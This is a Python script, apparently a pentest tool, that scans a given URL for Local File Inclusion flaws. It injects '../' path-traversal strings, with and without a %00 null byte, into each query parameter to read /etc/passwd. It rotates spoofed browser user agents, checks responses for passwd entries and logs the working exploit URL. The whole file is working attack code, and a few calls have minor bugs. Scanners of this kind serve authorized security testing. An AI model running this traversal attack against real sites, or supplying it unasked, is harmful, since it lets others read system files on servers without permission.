#!/usr/bin/python

# libraries and order is changed
import time
from datetime import datetime  # used to get the current date and time
from colorama import *
import getopt
import sys
import random  # use to generate random numbers in a given range
import requests  # used to make the requests to the link in order to get page source
from time import gmtime, strftime

#  User agents to simulate a browser client when making requests
fake_user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
    'Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
    'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)',
    'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 6.2; WOW64; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0)',
    'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)',
    'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)',
    'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)'
]


#  taking input url as argument and testing to see if the link is broken or not
def perform_test_url(scan_url_arg, LOG):
    LOG.emit("\n[i] Verifying the provided data")
    LOG.emit("[i] Connecting to the target with a random user agent!")
    fake_user_agent = random.choice(fake_user_agents)  # selecting a user agent randomly

    # creating a requests session replaced the urllib module used previously
    ses = requests.session()
    # updating headers
    ses.headers.update({'User-Agent': fake_user_agent})
    try:
        ses.get(scan_url_arg)  # requesting url for page source
    except Exception as e:
        LOG.emit("[!] Unable to connect to the target.")
        LOG.emit("[!] Error code: " + str(e))
        LOG.emit("[!] Thanks for using!\n\n")
        LOG.emit("[End Time]:" + str(datetime.now()))
    else:
        LOG.emit("[i] Connected to the target! ")
        LOG.emit("[i] Investigating the target...")
        LOG.emit("[i] looking to hunt some LFI vulnerabilities")
    ses.close()
    return


def usage_details(usage_details, LOG):  # information on how to run the script
    LOG.emit("[*] incorrect argument")
    LOG.emit("[*] Example: ""http://localhost/index.php?page=config.php\" \n\n")


    # helper function


def help_scan_print_1(url_parsed_arg, LOG):
    if len(url_parsed_arg.path) in [0]:  # checking if the link has script embedded init or not
        LOG.emit("[!] No script embedded in the link ")
    else:
        LOG.emit("[i] Script:" + url_parsed_arg.path)
    if len(url_parsed_arg.query) in [0]:
        LOG.emit("[!] No input parameters are included in the link.")
    else:
        LOG.emit("[i] URL parameters:" + url_parsed_arg.query + "\n")


def help_scan_print_2(param_sign_question, scan_url_arg, param_sign_equals, url_parsed_data, param_sign_ampersand, LOG):
    # check url for params
    test_1 = param_sign_question in scan_url_arg  # checking if the question mark(?) is there in url
    test_2 = param_sign_equals in scan_url_arg  # checking if the equal sign(=) is there in url
    if test_1 and test_2:  # check if both symbols are there we are sure there is atleast one parameter in the url
        LOG.emit("[+] Atleasy one parameter found.")
        LOG.emit("[+] Analysing further")
        # Looks like there is a parameter in the script lets see if there are more
        test_1 = param_sign_ampersand in url_parsed_data.query  # checking if ampersand is there in the url
        test_2 = param_sign_equals in url_parsed_data.query
        if test_1 and test_2:  # check if both checks are true it means we have more than one arguments
            LOG.emit("[i] Another parameter is found.")
        else:
            LOG.emit("[i] No more parameters found!")
    else:  # else we don't have any arguments
        LOG.emit('[*] Input string has no parameters')
        LOG.emit('[*] Use another link and make sure it has parameters in it')
        LOG.emit("[*] Example: http://example.com/over/there?name=ferret")
        LOG.emit("[End Time]:" + str(datetime.now()))


def scan_local_file_inclusion(scan_url_arg, LOG):  # main function for the whole scanning process
    # Define all variables of this function
    # defining all the variables and the symbols
    param_sign_equals = "="
    param_sign_question = "?"
    param_sign_ampersand = "&"
    null_byte = "%00"
    null_byte_required = 1
    nasty_string_pattern = "root:x:0:0:"
    nasty_string_pattern_2 = "mail:x:8:"

    original_value_of_tested_parameter = ""
    local_file_inclusion_found = 0
    step_into = "../"
    depth_limit = 20
    i = 0

    fake_user_agent = random.choice(fake_user_agents)  # making a random user agent
    system_file_directory = "etc/passwd"  # defining system file directories
    system_file_directory_for_first_test = "/etc/passwd"  # defining system file directories
    system_file_directory_inclusion_exploit_url = ""
    # parsing the url to get information we need from the url
    url_parsed_data = requests.utils.urlparse(scan_url_arg)
    LOG.emit("[i] IP address / domain: " + url_parsed_data.netloc)

    help_scan_print_1(url_parsed_data, LOG)
    help_scan_print_2(param_sign_question, scan_url_arg, param_sign_equals, url_parsed_data, param_sign_ampersand,
                      LOG)  # print based on parameters

    # Detect the data_params
    # data params help taken from atomized.org
    part_list = []
    for part in url_parsed_data[4].split('&'):  # parsing the parameters
        part_list.append(part.split('='))
    data_params = dict(part_list)

    # Count the data_params
    num_of_params = data_params.__len__()  # getting lenght of the parameters

    # print the data_params and store them in single variables
    LOG.emit("[i] Total parmas found: ", num_of_params)  # displaying parameter length
    LOG.emit("[i] Params" + str(data_params))  # displaying the parameters

    # Have a look at each parameter and test for LFI
    for index, data_item in enumerate(data_params):  # iterating through the parameters
        LOG.emit("[i] Working on \"" +  str(data_item))

        # Find out what value the checked parameter currently has
        for key, value in data_params.items():
            if key in [data_item]:
                # Save the value of the vulnerable parameter, so we later can search in the URL
                original_value_of_tested_parameter = value  # saving the orignal value of the input parameter
                break

        # Excluding the null byte first
        for depth_index in range(i, depth_limit):
            # Replace the default value of the vulnerable parameter with our LFI string
            string_replacement_2 = data_item + param_sign_equals + (depth_index * step_into) + system_file_directory

            # The first test is a special case. With the code above, we would check for the file "etc/passwd" which does not
            # work. Therefore we replace "etc/passwd" with "/etc/passwd" for our first vulnerability check.
            if depth_index in [0]:
                string_replacement_2 = data_item + param_sign_equals + system_file_directory_for_first_test

            replace_me = data_item + param_sign_equals + original_value_of_tested_parameter
            modified_query_string = url_parsed_data.query.replace(replace_me, string_replacement_2)

            # now craft the URL
            data_1 = ""
            for data__ in url_parsed_data[0:1]:
                data_1 += data__
            local_file_inclusion_url_part_one = data_1 + "://"

            data_1 = ""
            for data__ in url_parsed_data[1:2]:
                data_1 += data__
            local_file_inclusion_url_part_two = data_1

            data_1 = ""
            for data__ in url_parsed_data[2:3]:
                data_1 += data__
            local_file_inclusion_url_part_three = data_1 + "?"

            data_1 = ""
            for data__ in modified_query_string:
                data_1 += data__
            local_file_inclusion_url_part_four = data_1

            local_file_inclusion_url = local_file_inclusion_url_part_one + local_file_inclusion_url_part_two + local_file_inclusion_url_part_three + local_file_inclusion_url_part_four

            # creating a requests session
            ses = requests.session()
            # updating headers
            ses.headers.update({'User-Agent': fake_user_agent})
            try:
                local_file_inclusion_response = ses.get(local_file_inclusion_url)  # requesting url for page source
            except Exception as e:
                LOG.emit("[!] Unable to connect to the target.")
                LOG.emit("[!] Reason: ", e)
            else:
                local_file_inclusion_response_source_code = local_file_inclusion_response.text
                if str(nasty_string_pattern) in str(local_file_inclusion_response_source_code):
                    LOG.emit("[+] LFI found, without the use of %00")
                    LOG.emit(f"[+] {Fore.GREEN}Vulnerable link{Style.RESET_ALL}: " + local_file_inclusion_url)
                    system_file_directory_inclusion_exploit_url = local_file_inclusion_url
                    null_byte_required = 0
                    local_file_inclusion_found = 1
                    break
                else:
                    if str(nasty_string_pattern_2) in str(local_file_inclusion_response_source_code):
                        LOG.emit("[+] LFI found, without the use of %00")
                        LOG.emit(f"[+] {Fore.GREEN}Vulnerable link{Style.RESET_ALL}: " + local_file_inclusion_url)
                        system_file_directory_inclusion_exploit_url = local_file_inclusion_url
                        null_byte_required = 0
                        local_file_inclusion_found = 1
                        break

        if null_byte_required in [1]:
            # Here we are trying to use the null byte technique (%00) it is a technique to bypass
            # the file extension. For instance, if the target file is home.php, with this technique we will
            # be able to ignore everything after home ([.php] will be ingnored) and thus we will display
            # the interesting file we want. ( /etc/passwd).
            for depth_index in range(i, depth_limit):
                depth_into_byte = (depth_index * step_into) + system_file_directory + null_byte
                data_param_combo = data_item + param_sign_equals
                string_replacement_2 = data_param_combo + depth_into_byte

                if depth_index == 0:
                    string_replacement_2 = data_item + param_sign_equals + system_file_directory_for_first_test + null_byte

                replace_me = data_item + param_sign_equals + original_value_of_tested_parameter
                modified_query_string = url_parsed_data.query.replace(replace_me, string_replacement_2)

                data_1 = ""
                for data__ in url_parsed_data[0:1]:
                    data_1 += data__
                local_file_inclusion_url_part_one = data_1 + "://"

                data_1 = ""
                for data__ in url_parsed_data[1:2]:
                    data_1 += data__
                local_file_inclusion_url_part_two = data_1

                data_1 = ""
                for data__ in url_parsed_data[2:3]:
                    data_1 += data__
                local_file_inclusion_url_part_three = data_1 + "?"

                data_1 = ""
                for data__ in modified_query_string:
                    data_1 += data__
                local_file_inclusion_url_part_four = data_1

                local_file_inclusion_url = local_file_inclusion_url_part_one + local_file_inclusion_url_part_two + local_file_inclusion_url_part_three + local_file_inclusion_url_part_four

                # creating a requests session
                ses = requests.session()
                # updating headers
                ses.headers.update({'User-Agent': fake_user_agent})
                try:
                    local_file_inclusion_response = ses.get(local_file_inclusion_url)  # requesting url for page source
                except Exception as e:
                    LOG.emit("[!] The connection could not be established.")
                    LOG.emit("[!] Reason: ", e)
                else:
                    local_file_inclusion_response_source_code = local_file_inclusion_response.text
                    if str(nasty_string_pattern) in str(local_file_inclusion_response_source_code):
                        LOG.emit("[+] Our engine has detected an LFI, with nullbyte (%00) technique.")
                        LOG.emit("[+] {} Vulnerable link {}: ".format(Fore.GREEN, Style.RESET_ALL) + local_file_inclusion_url)
                        system_file_directory_inclusion_exploit_url = local_file_inclusion_url
                        local_file_inclusion_found = 1
                        break
                    else:
                        if str(nasty_string_pattern_2) in str(local_file_inclusion_response_source_code):
                            LOG.emit("[+] Our engine has detected an LFI, with nullbyte (%00) technique.")
                            LOG.emit(f"[+] {Fore.GREEN}Vulnerable link{Style.RESET_ALL}: " + local_file_inclusion_url)
                            system_file_directory_inclusion_exploit_url = local_file_inclusion_url
                            local_file_inclusion_found = 1
                            break
                ses.close()

    if local_file_inclusion_found == 0:  # checking if the LFIs are found
        LOG.emit("[!] We could not find anything.")
        LOG.emit("[!] We appreciate your presense here!\n\n")
        LOG.emit("[End Time]:", datetime.now())

    # generating a log file after the scanning is done in the same path where the tool is running, it contains some info about the scan and the result.
    log_file_name = url_parsed_data.netloc + "_" + strftime("%d_%b_%Y", gmtime()) + "_report.log"

    with open(log_file_name, "w") as file_ref:  # generating the log files
        file_ref.write("\t\t[+][+][+][+] Logs for Inclusion Vulnerability Scanner for Local File [+][+][+][+]\n\n")
        file_ref.write("Processed Link:\n")
        file_ref.write(scan_url_arg + "\n\n")
        file_ref.write("Local File Inclusion Link:\n")
        LOG.emit(system_file_directory_inclusion_exploit_url)
        file_ref.write(system_file_directory_inclusion_exploit_url)

    LOG.emit("\n[i] Log file created.")
    LOG.emit("[i] Done scanning, thanks for using!\n\n")
    LOG.emit("[End Time]:" + str(datetime.now()))


def lfi(url, LOG):
    delay = 10
    start = time.time()
    LOG.emit("\n[Start Time]:" +  str(datetime.now()))  # displaying the script start time
    LOG.emit("\n")
    input_url = url
    if len(input_url) < 1:  # if there is an error, print -help details
        usage_details(LOG)
        LOG.emit("[End Time]:" + str(datetime.now()))
        sys.exit(-1)
    # Continue if all required arguments were passed to the script.
    LOG.emit("[i] Processing the input link: " + input_url)  # in case input is good moving forward with the input url
    # Check if URL is reachable
    perform_test_url(input_url, LOG)  # performing test on input url
    time.sleep(time.time() - start)  # calculating time to sleep
    scan_local_file_inclusion(input_url, LOG)  # scan the file.

